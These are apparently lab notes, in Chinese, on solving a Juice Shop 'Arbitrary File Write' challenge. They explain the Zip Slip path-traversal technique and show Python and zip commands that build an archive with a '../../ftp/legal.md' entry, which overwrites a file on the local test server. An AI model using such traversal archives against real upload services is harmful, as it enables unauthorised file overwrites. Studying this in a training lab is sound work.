---
title: Arbitrary File Write
description: 收集可上传文件类型的已记录的漏洞信息，此处为 zip 压缩文件解压时其中文件的路径遍历与覆盖。上传位置不确定时，迭代目录遍历测试明显的路径。
---

- 描述：覆盖法律信息文件 http://127.0.0.1:3000/ftp/legal.md
- 上传文件路径
    http://127.0.0.1:3000/#/complain
    http://127.0.0.1:3000/#/photo-wall
    http://127.0.0.1:3000/profile 的上传头像功能

- 尝试对文件名进行遍历，但无效
- 查看示例解决方案
    > 研究 ZIP 相关漏洞也应该能发现 Zip Slip，它利用文件存档中的目录遍历文件名进行攻击。
    > 你需要覆盖的法律信息文件位于 http://localhost:3000/ftp/legal.md 而通过文件投诉上传文件不会提供任何存储位置的反馈，因此建议采用迭代目录遍历方法。
- 搜索 ```Zip Slip```
    > 攻击者在压缩包中嵌入文件名包含路径遍历序列（如 ../../../etc/passwd）的文件。解压工具在提取文件时，若未对文件名进行规范化处理和路径校验，会直接将文件写入遍历后的路径。

- 构建压缩文件，使用 python 代码生成拥有目录遍历文件的压缩包
    设置文件名与路径元数据为路径遍历
    ```python
    import zipfile
    with zipfile.ZipFile('exploit.zip', 'w') as z:
        z.writestr('../../ftp/legal.md', 'foobar') 
    ```
    - 上传此文件后成功覆盖目标文件

- 示例解决方案的linux 命令行
    ```sh
    zip exploit.zip ../../ftp/legal.md
    ```